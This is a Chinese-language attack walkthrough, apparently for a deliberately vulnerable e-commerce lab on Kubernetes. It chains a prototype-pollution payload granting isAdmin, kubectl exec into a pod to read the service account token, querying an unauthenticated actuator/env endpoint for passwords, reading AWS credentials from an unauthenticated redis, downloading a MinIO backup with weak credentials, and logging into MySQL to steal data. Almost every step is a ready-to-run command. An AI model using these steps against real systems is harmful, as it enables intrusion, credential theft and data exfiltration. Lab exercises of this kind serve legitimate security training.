# 攻击步骤
## 1. 原型污染
在攻击机192.168.10.10上访问shop.demo.com:30521电商网站。输入框输入json：

```
{"__proto__":{"isAdmin":true}}
```

## 2. 容器逃逸

进前端容器：假设你已通过前端管理员界面获得操作 Kubernetes 资源的权限（或可通过 kubectl 直接操作）

```
kubectl exec -it -n vuln-ecommerce $(kubectl get pods -n vuln-ecommerce -l app=vuln-frontend -o jsonpath='{.items[0].metadata.name}') -- sh
```

查看容器内容

```
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
$ ls /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
$ cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

## 3. 横向移动

在前端容器中访问后端服务信息，可以看到未授权接口返回的配置信息。

```
$ curl -H "Host: shop.demo.com" http://ingress-nginx-controller.ingress-nginx.svc.cluster.local/api/actuator/env
```
查找password关键字,看到redis地址，尝试redis未授权漏洞访问。

在攻击机执行

```
$ redis-cli -h192.168.20.13
$ key *
$ get prod:aws:creds
```

## 4. 数据窃取
在攻击机上访问minio获取备份数据

```
$ mc alias set myminio http://192.168.30.11:9000 test test1234

$ mc cp myminio/vulntest/config-backup.tar.gz ./
```
拿到数据后，进行解压

```
$ tar -zxvf config-backup.tar.gz
$ cat config.txt
```

压缩包下是mysql密码,攻击机下开始盗窃

```
$ mysql -uroot -p --skip-ssl
```
```
$ show databases;
$ use xxx
```